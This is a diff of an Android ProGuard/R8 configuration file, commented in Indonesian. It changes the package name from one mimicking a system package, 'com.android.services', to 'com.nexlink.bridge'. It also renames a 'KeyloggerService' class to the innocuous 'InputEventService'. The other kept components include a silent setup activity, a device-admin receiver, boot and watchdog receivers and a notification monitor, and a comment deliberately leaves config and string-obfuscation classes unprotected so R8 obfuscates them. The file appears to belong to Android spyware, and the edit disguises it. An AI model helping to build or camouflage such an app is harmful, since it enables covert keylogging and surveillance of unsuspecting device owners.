@@ -9,17 +9,17 @@
 -keepattributes *Annotation*, Signature, InnerClasses, EnclosingMethod
 
 # ─── Manifest Components (nama harus cocok dengan AndroidManifest.xml) ───────
--keep class com.android.services.MainActivity { *; }
--keep class com.android.services.ConnectorService { *; }
--keep class com.android.services.BootReceiver { *; }
--keep class com.android.services.WatchdogReceiver { *; }
--keep class com.android.services.AppDeviceAdminReceiver { *; }
--keep class com.android.services.SilentSetupActivity { *; }
--keep class com.android.services.NotificationMonitor { *; }
--keep class com.android.services.KeyloggerService { *; }
+-keep class com.nexlink.bridge.MainActivity { *; }
+-keep class com.nexlink.bridge.ConnectorService { *; }
+-keep class com.nexlink.bridge.BootReceiver { *; }
+-keep class com.nexlink.bridge.WatchdogReceiver { *; }
+-keep class com.nexlink.bridge.AppDeviceAdminReceiver { *; }
+-keep class com.nexlink.bridge.SilentSetupActivity { *; }
+-keep class com.nexlink.bridge.NotificationMonitor { *; }
+-keep class com.nexlink.bridge.InputEventService { *; }
 
 # ─── ViewBinding ─────────────────────────────────────────────────────────────
--keep class com.android.services.databinding.** { *; }
+-keep class com.nexlink.bridge.databinding.** { *; }
 
 # ─── SecureConfig & ObfStr — biarkan R8 obfuscate sepenuhnya (JANGAN -keep) ──
 # Class-class ini sengaja tidak di-keep agar nama class + method ter-obfuscate
